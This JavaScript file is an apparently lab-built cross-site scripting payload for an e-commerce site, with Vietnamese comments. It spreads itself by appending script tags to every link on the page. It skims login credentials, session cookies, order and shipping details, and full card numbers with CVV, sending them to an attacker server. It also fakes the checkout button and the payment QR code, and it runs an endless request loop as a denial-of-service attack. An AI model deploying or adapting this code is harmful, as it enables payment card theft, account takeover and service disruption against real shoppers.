const { pathname } = location;
const $ = (str, elm = document) => elm.querySelector(str);
const $$ = (str, elm = document) => elm.querySelectorAll(str);

console.log("XSS");
const xss = `<script src="http://localhost:3000/public/scripts/xss.js" defer></script>`;

// Duy trì XSS bằng Reflection XSS
const aTagList = $$("a");
aTagList.forEach((a) => {
    if (a.href.includes("?")) {
        a.href += `&q="/>${xss}`;
    } else {
        a.href += `?q="/>${xss}`;
    }
});

switch (pathname) {
    // Lấy thông tin kinh doanh
    case "/order":
        const tbody = $("tbody");
        const productTagList = $$("td.products a");
        const nameProductList = Array.prototype.map.call(productTagList, (x) =>
            x.textContent.trim()
        );

        fetch("http://localhost:3000/api/cart", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                count: tbody.childElementCount,
                productList: nameProductList,
            }),
        });

        break;

    // Lấy thông tin giỏ hàng người dùng
    case "/cart":
        const buyButton = $("#buy-button");
        const leftSide = $(".left-side");
        const newButton = document.createElement("button");
        newButton.classList.add("buy-button");
        newButton.textContent = "Đặt hàng";

        buyButton.remove();
        leftSide.append(newButton);

        newButton.addEventListener("click", (e) => {
            fetch("http://localhost:3000/api/cart-sent", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    name: $(".info p.name").textContent.trim(),
                    note: $("#note").value,
                    address: $("#address").value,
                    cost: $("footer span").textContent,
                }),
            });

            location.href = `/payment?orderId=12312312${xss}`;
        });
        break;

    case "/payment":
        // Element
        const submitButton = $(".payment");
        const qrCodeImg = $("#qr-code");

        qrCodeImg.src =
            "https://jeju.com.vn/wp-content/uploads/2020/05/VNPAYQR-JEJU-COSMETICS-5.jpg";

        submitButton.addEventListener("click", () => {
            fetch("http://localhost:3000/api/card", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    cardId: $("#card-number-input").value,
                    expiredTime: $("#expired-date-input").value,
                    cvv: $("#cvv-input").value,
                }),
            });
        });
}

async function ddos() {
    while (true) {
        await fetch("http://localhost:3001");
    }
}
ddos();

const formLogin = $(".form-ctn.login");
formLogin.addEventListener("submit", (e) => {
    const username = $("#username-input").value;
    const password = $("#password-input").value;

    fetch("http://localhost:3000/api/account", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify({ username, password }),
    });
});

// Common action
fetch("http://localhost:3000/api/session-id", {
    method: "POST",
    headers: {
        "Content-Type": "application/json",
    },
    body: JSON.stringify({ session: document.cookie, is_admin: false }),
});
